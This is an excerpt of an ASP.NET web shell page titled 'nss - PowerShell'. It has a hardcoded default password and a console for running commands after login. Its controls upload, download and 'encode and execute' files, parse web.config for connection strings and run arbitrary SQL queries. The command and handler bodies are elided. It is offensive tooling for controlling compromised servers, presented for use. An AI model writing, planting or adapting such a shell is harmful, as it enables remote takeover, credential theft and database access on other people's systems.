...
<script Language="c#" runat="server">
    ...
    protected void Login_Click(object sender, EventArgs e)
    {
        ...
        // Default Username is "nss" and Password is "nssnss2022@" without quotes and case-sensitive.
        if (Username.Text == "nss" && Password.Text == "nssnss2022@")
        {
            execution.Visible = true;
            execution.Enabled = true;
            authentication.Visible = false;
            output.Text = @"Welcome to nss - PowerShell";
        }
    }
...
<form id="Form1" method="post" runat="server" style="background-color: #808080">
    ...
    <asp:TextBox ID="output" runat="server" TextMode="MultiLine" BackColor="#34383c" ForeColor="White" style="height: 526px; width: 891px;" ReadOnly="True"></asp:TextBox>
    <asp:TextBox ID="console" runat="server" BackColor="#18191a" ForeColor="white" Width="891px" TextMode="MultiLine" Rows="1" onkeydown="if(event.keyCode == 13) document.getElementById('cmd').click()" Height="23px" AutoCompleteType="None"></asp:TextBox>
    

    </div>
    <div runat="server" style="width: auto; text-align:center">

        <asp:Button ID="cmd" runat="server" Text="Submit" OnClick="ps" BackColor="#be1445" ForeColor="white" />
        <asp:FileUpload ID="upload" runat="server" BackColor="#be1445" ForeColor="white"/>
        
        <asp:Button ID="uploadbutton" runat="server" Text="Upload the File" OnClick="uploadbutton_Click" BackColor="#be1445" ForeColor="white" />
        <asp:Button ID="encode" runat="server" Text="Encode and Execute" OnClick="encode_Click" BackColor="#be1445" ForeColor="white"/>
        <asp:Button ID="downloadbutton" runat="server" Text="Download" OnClick="downloadbutton_Click" BackColor="#be1445" ForeColor="white" /> <br />
        <asp:Button ID="ConnectionStr" runat="server" Text="Parse web.config" OnClick="ConnectionStr_Click" BackColor="#be1445" ForeColor="white"/>
        <asp:Button ID="executesql" runat="server" Text="Execute SQL Query" OnClick="executesql_Click" BackColor="#be1445" ForeColor="white" />
        <asp:TextBox ID="sqlconnectiostr" runat="server" Width="352px" BackColor="#be1445" ForeColor="white">Enter Connection String here to Execute SQL Queries</asp:TextBox>
    </div>
